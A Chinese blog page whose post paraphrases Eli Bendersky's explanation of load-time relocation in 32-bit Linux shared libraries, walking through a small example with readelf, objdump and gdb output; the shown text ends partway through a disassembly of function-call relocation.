<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Reverland的行知阁" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/4/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
            
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    
      
      

      
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/linux/2015/03/18/load-time-relocation-of-shared-libraries/" itemprop="url">
                  Load time relocation of shared libraries
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-18T00:00:00+08:00" content="2015-03-18">
              2015-03-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/linux/2015/03/18/load-time-relocation-of-shared-libraries/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2015/03/18/load-time-relocation-of-shared-libraries/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>想起昨天某厂电面被问到GOT怎么组织的= =，哈？我回头翻了翻Eli Bendersky的<a href="http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/" target="_blank" rel="external">Load-time relocation of shared libraries</a>和<a href="http://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/" target="_blank" rel="external">Position Independent Code (PIC) in shared libraries</a>。<a href="http://eli.thegreenplace.net" target="_blank" rel="external">Eli Bendersky</a>的网站我非常喜欢，他总能把复杂的问题以一种探索性的方式直观的阐释。我记得当我非常好奇gdb的原理时曾经看到过他的<a href="http://eli.thegreenplace.net/2011/01/23/how-debuggers-work-part-1/" target="_blank" rel="external">How debuggers work: Part 1 - Basics </a>和<a href="http://eli.thegreenplace.net/2011/01/27/how-debuggers-work-part-2-breakpoints/" target="_blank" rel="external">How debuggers work: Part 2 - Breakpoints</a>，都是难得一见的精品，值得一看</p>
<p>不吐槽面试了，作为面试简直是个惨不忍睹的失败展示，大概让面试官觉得我很low没发展前途，哈哈哈。不过被虐了感觉真好，要有空去面面各种开发测试产品设计。。。。。。一个人怎么能有这么多兴趣！</p>
<p>正文，省得过一段又忘的干干净净，意译<a href="http://eli.thegreenplace.net/2011/08/25/load-time-relocation-of-shared-libraries/" target="_blank" rel="external">Load-time relocation of shared libraries </a>x64对这个都没支持了= =</p>
<p>程序有时候，几乎总是要导入来自外部的目标代码。有两种载入的方式：</p>
<ul>
<li>载入时重定位</li>
<li>PIC(位置无关代码)</li>
</ul>
<p>讲讲第一种。</p>
<p>可执行文件，动态链接库，blablablabla的什么能直接被机器执行的文件，都是机器码(废话…)要让文件可以执行和装载，必须符合ELF文件规范。操作系统根据ELF文件中提供的信息，按照规范把对应的代码段映射到内存空间的对应位置上去。内存空间大概看上去像这样：</p>
<p><img src="http://static.duartes.org/img/blogPosts/linuxFlexibleAddressSpaceLayout.png" alt="x86内存空间地址分布"></p>
<p>可以看到，文件映射，动态库啥的都是放到差不多中间的位置。</p>
<p>举个例子，我们关心几个问题，<code>ml_func</code>内如何解析(reference)<code>myglob</code>呢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    myglob += a;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译为非PIC，x86 动态共享库</p>
<pre><code> ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -shared -o libmlreloc.so ml_mainreloc.o
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">ml_mainreloc</span>.<span class="title">o</span>: <span class="title">warning</span>: <span class="title">relocation</span> <span class="title">against</span> `<span class="title">myglob</span>' <span class="title">in</span> <span class="title">readonly</span> <span class="title">section</span> `.<span class="title">text</span>'.</span>
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">warning</span>: <span class="title">creating</span> <span class="title">a</span> <span class="title">DT_TEXTREL</span> <span class="title">in</span> <span class="title">object</span>.</span>
</code></pre><p>把<code>myglob</code>重定位到了只读的<code>.text</code>。。。不过对研究没啥影响。</p>
<p>首先看看库的入口地址，链接器会从入口地址(‘.text’的开始位置)开始把代码载入调用者的进程空间。</p>
<pre><code> <span class="regexp">~/Work/</span>project<span class="regexp">/blackhat/</span>eli  readelf -h libmlreloc.so
ELF <span class="string">Header:</span>
    ...
  Entry point <span class="string">address:</span>               <span class="number">0x420</span>
    ...
</code></pre><p>反汇编共享库</p>
<pre><code>~/Work/project/blackhat/eli  objdump -d -Mintel libmlreloc.so

libmlreloc.so:     file format elf32-i386
...
<span class="number">0000054</span>c &lt;ml_func&gt;:
 <span class="number">54</span>c:   <span class="number">55</span>                      push   ebp
 <span class="number">54</span>d:   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">54f</span>:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    edx,DWORD PTR ds:<span class="number">0x0</span>
 <span class="number">555</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
 <span class="number">558</span>:   <span class="number">01</span> d0                   add    eax,edx
 <span class="number">55</span>a:   a3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    ds:<span class="number">0x0</span>,eax
 <span class="number">55f</span>:   <span class="number">8</span>b <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    edx,DWORD PTR ds:<span class="number">0x0</span>
 <span class="number">565</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">0</span>c                mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]
 <span class="number">568</span>:   <span class="number">01</span> d0                   add    eax,edx
 <span class="number">56</span>a:   <span class="number">5</span>d                      pop    ebp
 <span class="number">56</span>b:   c3                      ret    
 ...
</code></pre><p><code>myglob</code>即<code>ds:0x0</code>丫的是什么！这个地址，在载入其它程序进程空间后会被替代。</p>
<p>如何呢？</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlreloc.so

Relocation section '.rel.dyn' at offset 0x358 contains 11 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ee8  <span class="number">00000008</span> R_386_RELATIVE   
00001eec  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002014</span>  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00000551</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">0000055</span>b  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">00000561</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
</code></pre><p>看看动态库文件中怎么记录该怎么替换哪里要替换的信息吧</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlreloc.so

Relocation section '.rel.dyn' at offset 0x358 contains 11 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ee8  <span class="number">00000008</span> R_386_RELATIVE   
00001eec  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002014</span>  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00000551</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">0000055</span>b  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
<span class="number">00000561</span>  <span class="number">00000601</span> R_386_32          <span class="number">00002018</span>   myglob
</code></pre><p>有这么好几处要替换的，看下位置和objdump的位置一样。</p>
<p>根据ELF文件规则。这些地址这样替换:</p>
<pre><code>Offset位置的地址=Sym.<span class="function"><span class="title">Value</span><span class="params">(用nm可以看到将来映射后相对于虚拟载入基址的偏移)</span></span> + 库文件载入基址
</code></pre><p>下面看看看。作为初始化了的数据，<code>myglob</code>是放在<code>.data</code>中的。我们看看<code>.data</code>在哪。</p>
<pre><code> ~/Work/project/blackhat/eli  readelf --segments libmlreloc<span class="class">.so</span>

Elf file type is DYN (Shared <span class="tag">object</span> file)
Entry point <span class="number">0</span>x420
There are <span class="number">7</span> program headers, starting at offset <span class="number">52</span>

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           <span class="number">0</span>x000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000000 <span class="number">0</span>x005fc <span class="number">0</span>x005fc R E <span class="number">0</span>x1000
  LOAD           <span class="number">0</span>x000ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00134 <span class="number">0</span>x00138 RW  <span class="number">0</span>x1000
  DYNAMIC        <span class="number">0</span>x000ef4 <span class="number">0</span>x00001ef4 <span class="number">0</span>x00001ef4 <span class="number">0</span>x000f8 <span class="number">0</span>x000f8 RW  <span class="number">0</span>x4
  GNU_EH_FRAME   <span class="number">0</span>x000580 <span class="number">0</span>x00000580 <span class="number">0</span>x00000580 <span class="number">0</span>x0001c <span class="number">0</span>x0001c R   <span class="number">0</span>x4
  GNU_STACK      <span class="number">0</span>x000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000 <span class="number">0</span>x00000 RW  <span class="number">0</span>x4
  GNU_RELRO      <span class="number">0</span>x000ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00001ee8 <span class="number">0</span>x00118 <span class="number">0</span>x00118 R   <span class="number">0</span>x1
  PAX_FLAGS      <span class="number">0</span>x000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000000 <span class="number">0</span>x00000 <span class="number">0</span>x00000     <span class="number">0</span>x4

 Section to Segment mapping:
  Segment Sections...
   <span class="number">00</span>     <span class="class">.hash</span> <span class="class">.gnu</span><span class="class">.hash</span> <span class="class">.dynsym</span> <span class="class">.dynstr</span> <span class="class">.gnu</span><span class="class">.version</span> <span class="class">.gnu</span><span class="class">.version_r</span> <span class="class">.rel</span><span class="class">.dyn</span> <span class="class">.rel</span><span class="class">.plt</span> <span class="class">.init</span> <span class="class">.plt</span> <span class="class">.text</span> <span class="class">.fini</span> <span class="class">.eh_frame_hdr</span> <span class="class">.eh_frame</span> 
   <span class="number">01</span>     <span class="class">.init_array</span> <span class="class">.fini_array</span> <span class="class">.jcr</span> <span class="class">.dynamic</span> <span class="class">.got</span> <span class="class">.got</span><span class="class">.plt</span> <span class="class">.data</span> <span class="class">.bss</span> 
   <span class="number">02</span>     <span class="class">.dynamic</span> 
   <span class="number">03</span>     <span class="class">.eh_frame_hdr</span> 
   <span class="number">04</span>     
   <span class="number">05</span>     <span class="class">.init_array</span> <span class="class">.fini_array</span> <span class="class">.jcr</span> <span class="class">.dynamic</span> <span class="class">.got</span> 
   <span class="number">06</span>     
</code></pre><p><code>.data</code>是第二个段，载入后的虚拟地址是<code>0x1ee8</code>，大小是<code>0x00134</code></p>
<pre><code>In [<span class="number">18</span>]: <span class="function"><span class="title">hex</span><span class="params">(<span class="number">0</span>x1ee8+<span class="number">0</span>x134)</span></span>
Out[<span class="number">18</span>]: <span class="string">'0x201c'</span>
</code></pre><p>第二个段扩展到<code>0x201c</code>包含<code>myglob</code>(<code>0x2018</code>)</p>
<p>linux下有个方便的<code>dl_iterate_phdr</code>函数来查看运行时载入的动态链接库。gdb的<code>i shared</code>也可以看到载入库的地址，不过只能看到入口地址而不能看到每个段。</p>
<p>用这么个例子来看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;link.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">header_handler</span><span class="params">(<span class="keyword">struct</span> dl_phdr_info* info, size_t size, <span class="keyword">void</span>* data)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"name=%s (%d segments) address=%p\n"</span>,</span><br><span class="line">            info-&gt;dlpi_name, info-&gt;dlpi_phnum, (<span class="keyword">void</span>*)info-&gt;dlpi_addr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; info-&gt;dlpi_phnum; j++) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\t\t header %2d: address=%10p\n"</span>, j,</span><br><span class="line">             (<span class="keyword">void</span>*) (info-&gt;dlpi_addr + info-&gt;dlpi_phdr[j].p_vaddr));</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\t\t\t type=%u, flags=0x%X\n"</span>,</span><br><span class="line">                 info-&gt;dlpi_phdr[j].p_type, info-&gt;dlpi_phdr[j].p_flags);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    dl_iterate_phdr(header_handler, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> t = ml_func(argc, argc);</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那啥回调啥原理不说了，我也不懂，反正用来看载入地址就好。</p>
<pre><code>✘  ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/blackhat/</span>eli  gcc -std=c99 -m32 -g -c driver.c -o driver.o
~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/blackhat/</span>eli  gcc -m32 -o driver driver.o -L. -lmlreloc 
</code></pre><p>直接gdb会话：</p>
<pre><code> ~/Work/project/blackhat/eli  gdb -q driver
Reading symbols from /home/reverland/Work/project/blackhat/eli/driver...done.
(gdb) b driver.c:<span class="number">31</span>
Breakpoint <span class="number">1</span> at <span class="number">0x804874b</span>: file driver.c, line <span class="number">31.</span>
(gdb) r
Starting program: /home/reverland/Work/project/blackhat/eli/driver 
warning: the debug information found in <span class="string">"/usr/lib64/debug/lib64/ld-2.17.so.debug"</span> does not match <span class="string">"/lib/ld-linux.so.2"</span> (CRC mismatch).
...
name=/home/reverland/Work/project/blackhat/eli/libmlreloc.so (<span class="number">7</span> segments) address=<span class="number">0xf7fd8000</span>
                 header  <span class="number">0</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x5</span>
                 header  <span class="number">1</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">2</span>: address=<span class="number">0xf7fd9ef4</span>
                         type=<span class="number">2</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">3</span>: address=<span class="number">0xf7fd8580</span>
                         type=<span class="number">1685382480</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">4</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1685382481</span>, flags=<span class="number">0x6</span>
                 header  <span class="number">5</span>: address=<span class="number">0xf7fd9ee8</span>
                         type=<span class="number">1685382482</span>, flags=<span class="number">0x4</span>
                 header  <span class="number">6</span>: address=<span class="number">0xf7fd8000</span>
                         type=<span class="number">1694766464</span>, flags=<span class="number">0x2800</span>
...
(gdb) p &amp;myglob
$<span class="number">1</span> = (<span class="keyword">int</span> *) <span class="number">0xf7fda018</span> &lt;myglob&gt;
(gdb) 
</code></pre><p>忽视调试信息的警告，那个我记得好像是gentoo的某个bug。我们看到，<code>libmlreloc.so</code>被载入到了<code>0xf7fd8000</code>，别太在意这个地址，按理说ALSR啥的这个地址变化挺正常，虽然我记得gdb中默认禁用alsr了。。。</p>
<p>第二个段在<code>0xf7fd9ee8</code>。这正好就是载入基址(<code>0xf7fd8000</code>)+VirtAddr(就是映射到目标进程空间后的偏移<code>0x00001ee8</code>)</p>
<p>另一方面，我们看到<code>myglob</code>在<code>0xf7fda018</code>。这个地址正好是载入基址(<code>0xf7fd8000</code>)+myglob的偏移(<code>0x00002018</code>)</p>
<p>我们最后在gdb中看下现在的(载入动态库后)的反汇编结果：</p>
<pre><code>(gdb) disas /r ml_func
Dump of assembler code for function ml_func:
   <span class="number">0xf7fd854c</span> &lt;+<span class="number">0</span>&gt;:     <span class="number">55</span>      <span class="keyword">push</span>   <span class="literal">ebp</span>
   <span class="number">0xf7fd854d</span> &lt;+<span class="number">1</span>&gt;:     <span class="number">89</span> e5   <span class="keyword">mov</span>    <span class="literal">ebp</span>,<span class="literal">esp</span>
   <span class="number">0xf7fd854f</span> &lt;+<span class="number">3</span>&gt;:     8b <span class="number">15</span> <span class="number">18</span> a0 fd f7       <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> <span class="literal">ds</span>:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd8555</span> &lt;+<span class="number">9</span>&gt;:     8b <span class="number">45</span> <span class="number">08</span>        <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0x8</span>]
   <span class="number">0xf7fd8558</span> &lt;+<span class="number">12</span>&gt;:    <span class="number">01</span> d0   <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd855a</span> &lt;+<span class="number">14</span>&gt;:    a3 <span class="number">18</span> a0 fd f7  <span class="keyword">mov</span>    <span class="literal">ds</span>:<span class="number">0xf7fda018</span>,<span class="literal">eax</span>
   <span class="number">0xf7fd855f</span> &lt;+<span class="number">19</span>&gt;:    8b <span class="number">15</span> <span class="number">18</span> a0 fd f7       <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> <span class="literal">ds</span>:<span class="number">0xf7fda018</span>
   <span class="number">0xf7fd8565</span> &lt;+<span class="number">25</span>&gt;:    8b <span class="number">45</span> 0c        <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
   <span class="number">0xf7fd8568</span> &lt;+<span class="number">28</span>&gt;:    <span class="number">01</span> d0   <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd856a</span> &lt;+<span class="number">30</span>&gt;:    <span class="number">5d</span>      <span class="keyword">pop</span>    <span class="literal">ebp</span>
   <span class="number">0xf7fd856b</span> &lt;+<span class="number">31</span>&gt;:    c3      <span class="keyword">ret</span>    
End of assembler dump.
</code></pre><p>呵，已经替换过了</p>
<p>综上，一切都很明显了，动态链接库ELF文件中有乱七八糟东西如何映射到目的进程的进程空间中去何处的信息，其中就包括有些地址要载入时替换的信息。操作系统负责这件事，在程序载入阶段计算地址，把该换的换掉。</p>
<h3 id="函数调用重定位">函数调用重定位</h3><p>换下<code>ml_main.c</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ml_util_func</code>被调用,编译</p>
<pre><code> ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -g -c ml_main.c -o ml_mainreloc.o
 ~<span class="regexp">/Work/project</span><span class="regexp">/blackhat/eli</span>  gcc -m32 -shared -o libmlreloc.so ml_mainreloc.o
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">ml_mainreloc</span>.<span class="title">o</span>: <span class="title">warning</span>: <span class="title">relocation</span> <span class="title">against</span> `<span class="title">myglob</span>' <span class="title">in</span> <span class="title">readonly</span> <span class="title">section</span> `.<span class="title">text</span>'.</span>
/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">gcc</span>/<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/4.7.3/../../../../<span class="title">x86_64</span>-<span class="title">pc</span>-<span class="title">linux</span>-<span class="title">gnu</span>/<span class="title">bin</span>/<span class="title">ld</span>: <span class="title">warning</span>: <span class="title">creating</span> <span class="title">a</span> <span class="title">DT_TEXTREL</span> <span class="title">in</span> <span class="title">object</span>.</span>
</code></pre><p>啥玩意：</p>
<pre><code><span class="number">0000057</span>c &lt;ml_util_func&gt;:
 <span class="number">57</span>c:   <span class="number">55</span>                      push   %ebp
 <span class="number">57</span>d:   <span class="number">89</span> e5                   mov    %esp,%ebp
 <span class="number">57f</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    <span class="number">0x8</span>(%ebp),%eax
 <span class="number">582</span>:   <span class="number">83</span> c0 <span class="number">01</span>                add    $<span class="number">0x1</span>,%eax
 <span class="number">585</span>:   <span class="number">5</span>d                      pop    %ebp
 <span class="number">586</span>:   c3                      ret    

<span class="number">00000587</span> &lt;ml_func&gt;:
 <span class="number">587</span>:   <span class="number">55</span>                      push   %ebp
 <span class="number">588</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp
 <span class="number">58</span>a:   <span class="number">83</span> ec <span class="number">14</span>                sub    $<span class="number">0x14</span>,%esp
 <span class="number">58</span>d:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    <span class="number">0x8</span>(%ebp),%eax
 <span class="number">590</span>:   <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    %eax,(%esp)
 <span class="number">593</span>:   e8 fc ff ff ff          call   <span class="number">594</span> &lt;ml_func+<span class="number">0xd</span>&gt;
 <span class="number">598</span>:   <span class="number">8</span>b <span class="number">55</span> <span class="number">0</span>c                mov    <span class="number">0xc</span>(%ebp),%edx
